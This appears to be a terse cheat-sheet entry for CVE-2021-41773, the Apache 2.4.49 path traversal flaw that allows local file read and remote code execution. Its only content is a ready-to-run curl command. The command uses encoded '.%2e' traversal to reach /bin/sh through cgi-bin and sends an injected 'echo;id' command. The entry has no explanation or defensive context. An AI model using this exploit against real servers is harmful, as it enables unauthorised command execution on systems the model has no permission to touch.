# CVE

## LFR & RCE (CVE-2021-41773)

<= Apache 2.4.49

```
curl --data "A=|echo;id" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```
